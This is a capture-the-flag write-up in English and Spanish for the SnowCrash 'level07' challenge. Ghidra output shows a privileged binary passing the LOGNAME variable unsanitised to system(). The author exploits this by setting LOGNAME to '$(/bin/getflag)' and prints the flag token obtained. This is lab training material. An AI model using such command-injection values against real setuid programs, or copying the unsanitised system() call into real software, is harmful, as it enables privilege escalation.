### LEVEL07

- I enter and find a binary named `level07`.
- I download the file locally.
    ```bash
    scp -P 4242 level07@192.168.1.36:~/home/user/level07/level07 . 
    ```
- Open with Ghidra
    ```c
    int main(int argc,char **argv,char **envp)

    {
      char *pcVar1;
      int iVar2;
      char *buffer;
      gid_t gid;
      uid_t uid;
      char *local_1c;
      __gid_t local_18;
      __uid_t local_14;
      
      local_18 = getegid();
      local_14 = geteuid();
      setresgid(local_18,local_18,local_18);
      setresuid(local_14,local_14,local_14);
      local_1c = (char *)0x0;
      pcVar1 = getenv("LOGNAME");
      asprintf(&local_1c,"/bin/echo %s ",pcVar1);
      iVar2 = system(local_1c);
      return iVar2;
    }
- The binary executes an echo on the value of the environment variable "LOGNAME."
- I attempt to inject a command into the variable.
    ```bash
    level07@SnowCrash:~$ export LOGNAME='$(echo "HOLA")'
    level07@SnowCrash:~$ ./level07
    HOLA
    ```
- I have the output from the execution of a command.
    ```bash
    level07@SnowCrash:~$ export LOGNAME='$(/bin/getflag)'
    level07@SnowCrash:~$ ./level07
    Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
    ```

---

### LEVEL07

- Entro y encuentro un binario `level07`
- Descargo el fichero en local
    ```bash
    scp -P 4242 level07@192.168.1.36:~/home/user/level07/level07 . 
    ```
- Abro con Ghidra
    ```c
    int main(int argc,char **argv,char **envp)

    {
      char *pcVar1;
      int iVar2;
      char *buffer;
      gid_t gid;
      uid_t uid;
      char *local_1c;
      __gid_t local_18;
      __uid_t local_14;
      
      local_18 = getegid();
      local_14 = geteuid();
      setresgid(local_18,local_18,local_18);
      setresuid(local_14,local_14,local_14);
      local_1c = (char *)0x0;
      pcVar1 = getenv("LOGNAME");
      asprintf(&local_1c,"/bin/echo %s ",pcVar1);
      iVar2 = system(local_1c);
      return iVar2;
    }
    ```

- Está el binario ejecuta un echo sobre el valor de la variable de entrono "LOGNAME"
- Intento inyectar un commando en la variable
    ```bash
    level07@SnowCrash:~$ export LOGNAME='$(echo "HOLA")'
    level07@SnowCrash:~$ ./level07
    HOLA
    ```
- Tengo salida de la ejecución de un comandos
    ```bash
    level07@SnowCrash:~$ export LOGNAME='$(/bin/getflag)'
    level07@SnowCrash:~$ ./level07
    Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
    ```
